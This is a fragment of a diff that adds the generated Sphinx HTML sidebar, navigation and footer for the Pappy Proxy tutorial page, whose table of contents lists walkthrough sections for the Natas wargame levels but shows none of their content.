+<li><a class="reference internal" href="#testing-it-out">Testing it Out</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#the-tutorial">The Tutorial</a><ul>
+<li><a class="reference internal" href="#setting-the-scope">Setting the Scope</a></li>
+<li><a class="reference internal" href="#natas-0">Natas 0</a></li>
+<li><a class="reference internal" href="#natas-1">Natas 1</a></li>
+<li><a class="reference internal" href="#natas-2">Natas 2</a></li>
+<li><a class="reference internal" href="#natas-3">Natas 3</a></li>
+<li><a class="reference internal" href="#finding-your-passwords-later-how-to-use-filters">Finding Your Passwords Later (How to Use Filters)</a><ul>
+<li><a class="reference internal" href="#filters">Filters</a></li>
+<li><a class="reference internal" href="#finding-passwords">Finding Passwords</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#natas-4">Natas 4</a></li>
+<li><a class="reference internal" href="#natas-5">Natas 5</a></li>
+<li><a class="reference internal" href="#natas-6">Natas 6</a></li>
+<li><a class="reference internal" href="#natas-7">Natas 7</a></li>
+<li><a class="reference internal" href="#natas-8">Natas 8</a></li>
+<li><a class="reference internal" href="#natas-9">Natas 9</a></li>
+<li><a class="reference internal" href="#skip-a-few-natas-15">Skip a few... Natas 15</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#conclusion">Conclusion</a></li>
+</ul>
+</li>
+</ul>
+
+  <h4>Previous topic</h4>
+  <p class="topless"><a href="includeme.html"
+                        title="previous chapter">The Pappy Proxy</a></p>
+  <h4>Next topic</h4>
+  <p class="topless"><a href=""
+                        title="next chapter">The Pappy Proxy Tutorial</a></p>
+  <div role="note" aria-label="source link">
+    <h3>This Page</h3>
+    <ul class="this-page-menu">
+      <li><a href="_sources/tutorial.txt"
+            rel="nofollow">Show Source</a></li>
+    </ul>
+   </div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <form class="search" action="search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    <p class="searchtip" style="font-size: 90%">
+    Enter search terms or a module, class or function name.
+    </p>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li class="right" >
+          <a href="#" title="The Pappy Proxy Tutorial"
+             >next</a> |</li>
+        <li class="right" >
+          <a href="includeme.html" title="The Pappy Proxy"
+             >previous</a> |</li>
+        <li class="nav-item nav-item-0"><a href="index.html">Pappy Proxy 0.0.1 documentation</a> &raquo;</li> 
+      </ul>
+    </div>
+    <div class="footer" role="contentinfo">
+        &copy; Copyright 2015, Rob Glew.
+      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.3.3.
+    </div>
+  </body>
+</html>
